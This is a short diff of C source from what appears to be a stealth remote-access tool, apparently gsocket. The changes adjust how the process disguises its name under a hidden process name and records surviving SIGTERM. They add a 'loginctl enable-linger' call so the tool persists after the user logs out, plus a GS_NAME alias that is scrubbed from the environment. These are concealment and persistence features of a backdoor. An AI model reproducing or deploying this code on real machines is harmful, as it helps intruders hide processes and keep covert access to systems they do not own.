@@ -372,10 +372,13 @@ changeargv0_finish(void) {
 			exit(0);
 	}
 
-	if (gopt.proc_hiddenname == NULL)
-		gopt.proc_hiddenname = GSNC_PROC_HN_SIGTERM; // can not happen.
-	if (strcmp(gopt.proc_hiddenname, GSNC_PROC_HN_SIGTERM) == 0)
-		gopt.flags |= GSC_FL_SWD_SURVIVED_SIGTERM;
+	if (gopt.proc_hiddenname) {
+		if (strcmp(gopt.proc_hiddenname, GSNC_PROC_HN_SIGTERM) == 0)
+			gopt.flags |= GSC_FL_SWD_SURVIVED_SIGTERM;
+	} else {
+		// Can happen if started without config.
+		gopt.proc_hiddenname = GSNC_PROC_HN_SIGTERM;
+	}
 
 	DEBUGF("Now hidden as gopt.proc_hiddenname=%s [orig EXENAME=%s]\n", gopt.proc_hiddenname, gopt.prg_exename);
 	// SEAL after config had been read.
@@ -469,6 +472,9 @@ try_systemd_run() {
 	char *argv[] = { "systemd-run", "--quiet", "--scope", "--user", gopt.prg_exename, NULL };
 	execvp("systemd-run", argv);
 	DEBUGF("execv(%s): %s\n", gopt.prg_exename, strerror(errno));
+	// dbus denied. Try to enable lingering
+	system("loginctl enable-linger $(id -un) 2>/dev/null");
+	// ls /var/lib/systemd/linger/
 }
 
 static void
@@ -730,7 +736,7 @@ init_defaults1(int argc, char *argv[]) {
 	if ((ptr = GS_getenv("GS_PORT")) != NULL)
 		gopt.gs_port = atoi(ptr);
 
-	if ((ptr = GS_getenv("GS_PROC_HIDDENNAME")) != NULL)
+	if ((ptr = GS_getenv("GS_PROC_HIDDENNAME")) != NULL || (ptr = GS_getenv("GS_NAME")) != NULL)
 		gopt.proc_hiddenname = strdup(ptr);
 
 	if (GS_getenv("GS_REEXEC") != NULL)
@@ -988,6 +994,7 @@ init_vars(void)
 	zap_env("_GS_SWD");
 	zap_env("GS_ARGS");
 	zap_env("GS_PROC_HIDDENNAME");
+	zap_env("GS_NAME");
 	zap_env("GS_BEACON");
 	zap_env("GS_PORT");
 	zap_env("GS_HOST");
